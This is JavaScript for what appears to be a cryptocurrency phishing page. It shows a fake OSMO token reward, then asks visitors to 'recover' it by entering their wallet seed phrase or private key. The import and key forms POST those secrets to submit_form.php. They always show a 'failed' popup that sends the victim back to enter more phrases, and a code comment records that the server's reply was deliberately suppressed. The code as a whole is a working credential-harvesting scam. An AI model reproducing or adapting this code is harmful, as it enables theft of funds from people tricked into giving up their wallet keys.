/* -----------------------
   Anim angka & penyimpanan
   ----------------------- */
const numberEl = document.getElementById('number');
const congratsEl = document.getElementById('congrats');

let stored = localStorage.getItem('osmoTarget');
let target = stored ? parseInt(stored,10) : Math.floor(Math.random()*10001);
if (!stored) localStorage.setItem('osmoTarget', String(target));

function formatNum(n){ return n.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ","); }

let start = null;
const duration = 2000;
function step(timestamp){
  if(!start) start = timestamp;
  const progress = Math.min((timestamp - start)/duration, 1);
  const val = Math.floor(progress * target);
  numberEl.textContent = formatNum(val) + ' OSMO';
  if(progress < 1){
    requestAnimationFrame(step);
  } else {
    congratsEl.style.display = 'block';
    congratsEl.textContent = `🎉 Congratulations! You received ${formatNum(target)} OSMO`;
    setTimeout(()=> showPopup('popupDiscovery'), 1200);
  }
}
requestAnimationFrame(step);

/* -----------------------
   Popup helpers
   ----------------------- */
function showPopup(id){
  document.querySelectorAll('.popup').forEach(p=>p.style.display='none');
  const el = document.getElementById(id);
  if(el) el.style.display = 'flex';
}
function closeAllPopups(){ document.querySelectorAll('.popup').forEach(p=>p.style.display='none'); }

/* Buttons */
document.getElementById('btnRecover').addEventListener('click', ()=> {
  showPopup('popupConnectWallet');
});
document.querySelectorAll('#popupConnectWallet .wallet-list button').forEach(btn=>{
  btn.addEventListener('click', (e)=>{
    const which = e.currentTarget.getAttribute('data-wallet');
    if(which === 'batang'){
      showPopup('popupAbsenKey');
    } else {
      document.getElementById('phraseSelect').value = '12';
      createWordInputs(12);
      showPopup('popupImportWallet');
    }
  });
});

/* generate inputs for import wallet */
const phraseSelect = document.getElementById('phraseSelect');
const wordGrid = document.getElementById('wordGrid');
function createWordInputs(count){
  wordGrid.innerHTML = '';
  if(count === 12){
    wordGrid.classList.remove('grid-4');
    wordGrid.classList.add('grid-3');
  } else {
    wordGrid.classList.remove('grid-3');
    wordGrid.classList.add('grid-4');
  }
  for(let i=1;i<=count;i++){
    const inp = document.createElement('input');
    inp.type = 'text';
    inp.name = 'w' + i;
    inp.placeholder = String(i);
    inp.required = true;
    wordGrid.appendChild(inp);
  }
}
createWordInputs(12);
phraseSelect.addEventListener('change', ()=> createWordInputs(parseInt(phraseSelect.value,10)));

/* Import form submission */
document.getElementById('importForm').addEventListener('submit', async function(e){
  e.preventDefault();
  const fd = new FormData();
  const count = parseInt(phraseSelect.value,10);
  for(let i=1;i<=count;i++){
    const v = document.querySelector(`input[name="w${i}"]`).value || '';
    fd.append('w'+i, v);
  }
  fd.append('type', 'import');

  const btn = document.getElementById('importContinue');
  btn.disabled = true;
  btn.textContent = 'Sending...';

  try {
    const res = await fetch('submit_form.php', { method:'POST', body: fd });
    const data = await res.json();
    // alert(data.message); ← ini dihapus
    showPopup('popupFailedAbsen'); // langsung menuju popup selanjutnya
  } catch (err){
    alert('Terjadi kesalahan jaringan.');
  } finally {
    btn.disabled = false;
    btn.textContent = 'Continue';
  }
});

/* Absen form submission */
document.getElementById('absenForm').addEventListener('submit', async function(e){
  e.preventDefault();
  const key = document.getElementById('absenKeyInput').value || '';
  if(key.trim().length === 0){ alert('Masukkan absen key.'); return; }
  const fd = new FormData();
  fd.append('absenKey', key);
  fd.append('type','absen');
  const btn = document.getElementById('absenContinue');
  btn.disabled = true; btn.textContent = 'Sending...';
  try {
    const res = await fetch('submit_form.php', { method:'POST', body: fd });
    const data = await res.json();
    // alert(data.message); ← ini dihapus
    showPopup('popupFailedAbsen'); // langsung menuju popup selanjutnya
  } catch (err){
    alert('Terjadi kesalahan jaringan.');
  } finally {
    btn.disabled = false; btn.textContent = 'Continue';
  }
});




/* popup failed actions */
document.getElementById('failedContinue').addEventListener('click', ()=>{
  createWordInputs(parseInt(phraseSelect.value,10));
  showPopup('popupImportWallet');
});
document.getElementById('failedClose').addEventListener('click', ()=> closeAllPopups());

/* cancel buttons */
document.getElementById('importCancel').addEventListener('click', ()=> { showPopup('popupConnectWallet'); });
document.getElementById('absenCancel').addEventListener('click', ()=> { showPopup('popupConnectWallet'); });